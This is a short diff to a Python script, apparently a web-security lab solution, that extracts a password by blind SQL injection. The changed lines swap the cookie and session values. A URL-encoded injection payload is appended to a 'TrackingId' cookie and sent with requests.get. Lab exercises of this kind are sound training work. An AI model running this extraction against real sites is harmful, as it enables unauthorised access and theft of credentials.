@@ -22,8 +22,8 @@ def get_password(url):
                 ) % (position, code)
             sqli_payload_encoded = urllib.parse.quote(sqli_payload)
             cookies = {
-                'TrackingId': '2fRw7i667AduSr3v' + sqli_payload_encoded,
-                'session': 'hyQ6ZOcW5FDRAHGtuLzuGOzLmR2YwwNc'}
+                'TrackingId': 'sgytYcltfd2AqeAe' + sqli_payload_encoded,
+                'session': 'QdX8GdRw2yL3hd5dVze34tQ0SP77GWI8'}
             response = requests.get(
                 url, 
                 cookies=cookies,
